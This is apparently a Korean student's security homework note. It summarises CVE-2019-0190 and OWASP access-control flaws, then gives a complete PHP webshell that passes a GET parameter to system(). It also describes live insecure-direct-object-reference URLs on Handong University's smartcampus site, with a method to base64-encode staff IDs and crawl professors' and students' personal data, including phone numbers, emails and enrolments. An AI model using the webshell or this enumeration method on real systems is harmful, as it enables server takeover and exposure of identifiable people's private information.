# HW1
### 1. CVE-2019-0190

mod_ssl 2.4.37 remote DoS when used with OpenSSL 1.1.1 

*A bug exists in the way mod_ssl handled client renegotiations. A remote attacker could send a carefully crafted request that would cause mod_ssl to enter a loop leading to a denial of service. This bug can be only triggered with Apache HTTP Server version 2.4.37 when using OpenSSL version 1.1.1 or later, due to an interaction in changes to handling of renegotiation attempts.

아파치 2.4.37버전에서 OpenSSl 1.1.1버전을 사용할 때, renegotiations 요청의 처리에 대한 변경사항을 악용해 조작하여 요청하면 mod_ssl을 무한 루프에 빠지게 하는 DoS공격으로 이어질 수 있는 취약점. **현재는 패치된 상태이다

### 2. OWASP에서 말하는 웹 취약점

취약한 접근 통제와 잘못된 보안 구성

 1.접근할 수 있는 권한이나 시스템 정보를 얻기 위해 패치 되지 않은 취약점을 공격하거나 디폴트 계정, 미사용 페이지, 보호받지 못하는 파일이나 디렉토리에 접근을 시도한다.

 2.방지 : 세분화, 컨테이너화, 클라우드 보안 그룹과 같은 방법으로 구성요소나 입주자들 간에 효율적이고 안전한 격리를 제공.
 불필요한 기능, 구성 요소, 문서, 샘플 애플리케이션 없이 최소한으로 플랫폼을 유지하고 사용하지 않는 기능과 프레임 워크는 삭제.

대표적인 예 : 한동대의 웹페이지들
![image](https://blogfiles.pstatic.net/MjAxOTA3MDlfMjc4/MDAxNTYyNjU0NTg2MzE0.ZJK_34LnlXKuwll25TNIbMGRDXbluZY85VYXAAO51uUg.0M66IJxGffdbOk0afclh4o_9MrOtyDI0nlb6XFoAoCYg.PNG.potenpanda/KakaoTalk_Photo_2019-07-09-15-42-49.png)

위의 사진과 같이 주소를 조작해 잘못된 database를 보내니 해당하는 서비스 검색을 제공하는 php파일이 들어있는 경로 유출.

또한 사이트 자체가 병렬적인 구조를 가지고 있어 그저 주소창에 입력하는것만으로도 원래 필요한 절차를 건너 뛸 수 있음.
인코딩 또한 base64를 통해서 간단하게 변환 가능.

ffive - smartcampus 아카이브에 공개된 취약점의 대부분이 이러한 구조때문에 노출된 것.

### 3. 실제 감동 실화

 1.2019년 4월 1일 - 킹-갓-보안왕 한찬솔 님께서 히즈넷 신청/예약 페이지를 농락하심
 
 2.간단한 webshell 코드.
 
 ``` <html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if($_GET['cmd'])
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
 ```

### 4. 끄적이다 찾은거.

그냥 어제 끄적이다가 발견한것. smartcampus에 안올라 와있으나 이미 알고 있는 정보일 수도 있음.

http://smart.handong.edu/students/index.php/main/lookup_lists/MjE4MDAzNzA=/v4/
이름 검색시 사진, 전화번호, 이메일 한번에 열람 가능

위에꺼에서 바꾸다가 알게된거

http://smart.handong.edu/students/index.php/main/lookup_lists/MjE4MDAzNzA=/v2/
저기에 있는 학번(현재는 내꺼)를 직번으로 바꾸면 해당 교수님의 역대 팀 구성원들 정보(개인정보 포함), 전공팀 정보, 자신의 개설과목 수강신청 정보(아쉽게도? 성적은 못봄)등 유익한 정보들 열람 가능.

예 ) 존경하는 킹 갓 이종원 교수님 10050의 직번 -> MTAwNTA=

홍참길 교수님은 03년 1학기 이종원 교수님의 회로이론 1을 수강하였다.
![모자이크 못해서 죄송해요](https://postfiles.pstatic.net/MjAxOTA3MDlfMTQw/MDAxNTYyNjY0MTk0NjAx.1XxuL5DlgUygbCnFnvSBukkNjDUKYL3glzN7WEgPDHIg.RycCZRSfaS37ptufIk2wyL_YKcY5DQ9QN6tj9d7lEUog.PNG.potenpanda/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7_2019-07-09_%EC%98%A4%ED%9B%84_6.22.19.png?type=w773)

 *존재하는 직번이면 css selector div h4의 이름이 **학생정보 조회**, 존재 하지 않으면 **교직원 조회** 라고 뜸.
이걸 이용해서 조건문을 돌려 유효하는 교수님의 이름과 직번 traversal해서 크롤링 가능. (api/user 페이지에 없는 교수님들도 있기 때문에)





